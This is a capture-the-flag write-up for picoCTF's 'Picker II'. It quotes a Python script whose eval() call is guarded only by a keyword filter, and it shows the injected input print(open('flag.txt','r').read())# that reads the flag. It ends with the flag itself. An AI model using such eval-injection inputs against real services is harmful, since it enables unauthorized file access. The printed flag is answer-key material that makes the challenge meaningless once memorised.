#Challenge: Picker II

#Objective
Figure out how the python program works to get the flag

#Solution Steps
1. Download all necessary files
    wget https://artifacts.picoctf.net/c/523/picker-II.py
2. Checked contents of directory
    ls
3. Found picker-II.py file, examined contents of file
    nano picker-II.py
4. Found functions related to flag inside file
    def win():
        # This line will not work locally unless you create your own 'flag.txt' in
        #   the same directory as this script
        flag = open('flag.txt', 'r').read()
        #flag = flag[:-1]
        flag = flag.strip()
        str_flag = ''
        for c in flag:
            str_flag += str(hex(ord(c))) + ' '
        print(str_flag)
  
    def filter(user_input):
    if 'win' in user_input:
        return False
    return True

    while(True):
    try:
        user_input = input('==> ')
        if( filter(user_input) ):
        eval(user_input + '()')
        else:
        print('Illegal input')
    except Exception as e:
        print(e)
        break
5. win function gives flag but is filtered out in filter function. However, user input function evaluates all inputs and adds '()'; tried reading flag.txt
    nc saturn.picoctf.net 50649

    open('flag.txt', 'r').read
6. Program executes with no error but no output is shown, adjusted command to show output
    print(open('flag.txt', 'r').read())#
7. Extracted flag from output
    flag: picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}

#Learned
How to exploit input evaluation functions that don't have proper input validation
